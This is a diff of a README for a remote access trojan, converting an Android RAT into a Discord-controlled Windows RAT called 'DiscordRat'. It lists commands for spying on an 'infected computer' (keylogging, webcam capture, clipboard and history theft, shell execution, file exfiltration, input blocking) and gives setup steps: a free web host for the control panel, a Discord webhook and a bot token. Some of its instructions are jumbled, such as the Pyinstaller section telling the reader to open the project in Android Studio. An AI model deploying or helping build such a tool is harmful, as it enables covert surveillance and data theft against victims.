@@ -33,58 +33,50 @@ Python3,Windows(x64)
 ## **Modules**
 ```
 Availaible commands are :
+--> /command help = will give all command
 --> /message = Show a message box displaying your text / Syntax  = "/message example"
---> !shell = Execute a shell command /Syntax  = "/shell whoami"
---> !webcampic = Take a picture from the webcam
---> !windowstart = Start logging current user window (logging is shown in the bot activity)
---> !windowstop = Stop logging current user window 
---> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
---> !admincheck = Check if program has admin privileges
---> !sysinfo = Gives info about infected computer
---> !history = Get computer navigation history
---> !download = Download a file from infected computer
---> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
---> !cd = Changes directory
---> !write = Type your desired sentence on infected computer
---> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
---> !clipboard = Retrieve infected computer clipboard content
---> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
---> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
---> !stopkeylogger = Stops keylogger
---> !dumpkeylogger = Dumps the keylog
---> !volumemax = Put volume at 100%
---> !volumezero = Put volume at 0%
---> !idletime = Get the idle time of user's on target computer
---> !sing = Play chosen video in background
---> !stopsing = Stop video playing in background
---> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
---> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
---> !screenshot = Get the screenshot of the user's current screen
---> !exit = Exit program
---> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
+--> /shell = Execute a shell command /Syntax  = "/shell whoami"
+--> /command webcampic = Take a picture from the webcam
+--> /command windowstart = Start logging current user window (logging is shown in the bot activity)
+--> /command windowstop = Stop logging current user window 
+--> /voice = Make a voice say outloud a custom sentence / Syntax = "/voice test"
+--> /command admincheck = Check if program has admin privileges
+--> /command sysinfo = Gives info about infected computer
+--> /command history = Get computer navigation history
+--> /download = Download a file from infected computer
+--> /upload = Upload file from website to computer / Syntax = "/upload url" 
+--> /cd = Changes directory
+--> /write = Type your desired sentence on infected computer
+--> /wallpaper = Change infected computer wallpaper / Syntax = "/wallpaper url" 
+--> /command clipboard = Retrieve infected computer clipboard content
+--> /command startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
+--> /command stopkeylogger = Stops keylogger
+--> /command dumpkeylogger = Dumps the keylog
+--> /command volumemax = Put volume at 100%
+--> /command volumezero = Put volume at 0%
+--> /command idletime = Get the idle time of user's on target computer
+--> /command blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
+--> /command unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
+--> /command screenshot = Get the screenshot of the user's current screen
+--> /command exit = Exit program
+--> /command kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
 ```
 
-### Prerequisites 
- - Android Studio
 
-OR
 
-- [ApkEasyTool](https://forum.xda-developers.com/android/software-hacking/tool-apk-easy-tool-v1-02-windows-gui-t3333960)
+
 ---  
-### Building Apk With Android Studio
+### Building exe With Pyinstaller
 
-1.  Open Project ***BlackMart*** in Android Studio 
-2.  Put the `command.php` link of server in InternalService.class class
-3.  Now open `NotificationListener.java` and enter  replace with your discord webhook url
-4.  Build the Project
-5.  Zipalign and sign the Apk...
+1.  create a user in https://000webhost.com
+2.  create a web and post public and private files
+3.  Open Project ***DiscordRat*** in Android Studio 
+4. Put the `your 000webhost link` link of server in python file
+5. open your web in public directory and 
+6. post your webhook
+7. post your bot token
+8. post your bot server gild 
 ---
-### Building Apk with ApkEasyTool:
-
-1. Download <a href="https://github.com/swagkarna/Rafel-Rat/releases/download/release/BlackMart.apk">BlackMartapk</a> and  decompile with `Apktool` and navigate to `smali_classes2\com\velociraptor\raptor`
-2. Open `InternalService.smali` 
-3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
-4. Now open `NotificationListener.smali` and enter replace with your discord webhook url
 
 ---
 ### Building Server 
@@ -104,7 +96,7 @@ Watch Video in Full Screen For Better Quality
 ## Screenshots[New]
 | | | |
 |:-------------------------:|:-------------------------:|:-------------------------:|
-|<a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> Panel-1</a> | <a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> Panel-2</a> |<a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=trueg"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=true"> Panel-3 </a>||
+|<a href="https://github.com/BlackDemonHat/Discord-Rat/images/Screenshot(1).png?raw=true"> <img width="2000" src="https://github.com/BlackDemonHat/Discord-Rat/images/Screenshot(2).png?raw=true?raw=true"> Panel-1</a> | <a href="https://github.com/BlackDemonHat/Discord-Rat/images/Screenshot(3).png?raw=true?raw=true"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> Panel-2</a> |<a href="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=trueg"> <img width="2000" src="https://github.com/swagkarna/Rafel-Rat/blob/main/Screenshots/Screenshot%20(72).png?raw=true"> Panel-3 </a>||
 
 ---
 
